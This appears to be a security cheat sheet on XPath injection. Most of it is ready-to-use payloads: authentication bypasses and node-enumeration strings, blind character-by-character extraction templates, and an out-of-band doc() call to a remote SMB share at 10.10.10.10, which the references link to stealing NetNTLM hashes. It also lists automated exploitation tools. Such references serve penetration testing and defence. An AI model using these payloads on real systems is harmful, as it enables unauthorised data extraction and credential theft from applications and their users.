# XPATH injection

> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Summary

* [Exploitation](#exploitation)
* [Blind exploitation](#blind-exploitation)
* [Out Of Band Exploitation](#out-of-band-exploitation)
* [Tools](#tools)
* [References](#references)

## Exploitation

Similar to SQL : `"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"`

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

## Blind Exploitation

1. Size of a string
    ```sql
    and string-length(account)=SIZE_INT
    ```
2. Extract a character
    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

## Out Of Band Exploitation

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## Tools

- [xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
- [xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool 
- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text 
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool

## References

* [OWASP XPATH Injection](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
